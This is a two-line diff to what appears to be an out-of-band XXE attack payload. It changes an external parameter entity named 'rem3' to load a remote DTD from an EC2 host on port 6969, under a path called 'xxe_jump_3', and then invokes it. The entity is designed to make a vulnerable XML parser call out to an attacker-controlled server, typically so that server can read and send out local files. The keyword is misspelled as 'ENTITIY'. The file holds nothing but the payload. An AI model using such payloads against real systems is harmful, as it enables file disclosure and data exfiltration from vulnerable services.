@@ -1,2 +1,2 @@
-<!ENTITIY % rem3 SYSTEM "http://ec2-35-180-29-78.eu-west-3.compute.amazonaws.com/c-tool-f/xxe_jump_3">
+<!ENTITIY % rem3 SYSTEM "http://ec2-35-180-29-78.eu-west-3.compute.amazonaws.com:6969/xxe_jump_3">
 %rem3;
